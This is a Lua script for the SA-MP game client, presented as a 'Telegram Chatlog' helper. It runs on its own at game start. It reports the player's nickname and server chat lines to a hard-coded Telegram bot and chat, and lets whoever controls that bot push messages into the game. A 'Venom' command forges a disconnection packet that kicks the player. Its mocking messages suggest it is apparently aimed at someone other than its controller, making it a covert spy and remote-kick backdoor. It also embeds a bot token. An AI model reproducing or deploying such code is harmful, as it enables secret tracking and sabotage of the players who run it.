script_name("Telegram Chatlog")
script_version("1.1 Auto")
script_author("Sbyte (fixed by ChatGPT)")

local sampev = require("samp.events")
local effil = require("effil")
local encoding = require("encoding")
encoding.default = "CP1251"
local u8 = encoding.UTF8
local sf = require "sampfuncs"
local json = require("dkjson")
local https = require("ssl.https")
local ltn12 = require("ltn12")

-- Переместил token и chat_id ВЫШЕ, чтобы они были доступны при создании api_url
local bot_token = "8139835977:AAGTdJHRzd28s6FdJF3AbzUKUHGVSzy74j4"
local chat_id = "1478321271"

local api_url = "https://api.telegram.org/bot" .. bot_token .. "/sendMessage"
local api_url2 = "https://api.telegram.org/bot" .. bot_token .. "/getUpdates"

local last_update_id = 0
local checkstats = false
local nickname = ""

function encodeUrl(str)
    str = str:gsub(' ', '+')
    str = str:gsub('\n', '%%0A')
    return u8:encode(str, 'CP1251')
end

function send_to_telegram(text)
    text = text:gsub("{......}", "")
    local encoded_text = encodeUrl(text)
    local url = api_url .. "?chat_id=" .. chat_id .. "&text=" .. encoded_text
    async_http_request(url)
end

function requestRunner()
    return effil.thread(function(url)
        local https = require("ssl.https")
        pcall(https.request, url)
    end)
end

function async_http_request(url)
    local runner = requestRunner()
    runner(url)
end

function sampev.onServerMessage(color, text)
    if text:find("%u%l+_%u%l+%[%d+%]") then
        text = text:gsub("{......}", "")
        send_to_telegram(text)
    if text:find("Сервер загружается...") then
        send_to_telegram("Чел с ником" .. nickname .. "отправился в помойку!")
     end
    end
end

function main()
    repeat wait(500) until isSampAvailable() and isSampLoaded()
    wait(10000)
    sampSendChat("/stats")
    checkstats = true

    lua_thread.create(function()
        while true do
            get_updates()
            wait(5000)
        end
    end)
end

function sampev.onShowDialog(dialogid, style, title, button1, button2, text)
    if title:find('Основная статистика') and checkstats then
        local raw_nickname = text:match("{FFFFFF}Имя: {B83434}%[(.-)%]")
        if raw_nickname then
            nickname = raw_nickname
            send_to_telegram("Зашел тип под ником: " .. nickname)
        end
        checkstats = false
    end
end

function get_updates()
    local response_body = {}
    local result, code = https.request{
        url = api_url2 .. "?offset=" .. (last_update_id + 1),
        sink = ltn12.sink.table(response_body)
    }

    if code ~= 200 then
        print("Ошибка запроса от Telegram API")
        return
    end

    local response_text = table.concat(response_body)
    local data, _, err = json.decode(response_text)

    if err then
        print("Ошибка JSON декодирования: " .. err)
        return
    end

    if not data.result then return end

    for _, update in ipairs(data.result) do
        last_update_id = update.update_id
        if update.message and update.message.text then
            local text = u8:decode(update.message.text)
            if text:find("^Venom%s*$") then
    main_reconnect()
else
    sampAddChatMessage(encoding.CP1251:encode(text), -1)
end
        end
    end
end


function main_reconnect()
    local bs = raknetNewBitStream()
    raknetBitStreamWriteInt8(bs, sf.PACKET_DISCONNECTION_NOTIFICATION)
    raknetSendBitStreamEx(bs, sf.SYSTEM_PRIORITY, sf.RELIABLE, 0)
    raknetDeleteBitStream(bs)

    bs = raknetNewBitStream()
    raknetEmulPacketReceiveBitStream(sf.PACKET_CONNECTION_LOST, bs)
    raknetDeleteBitStream(bs)
end
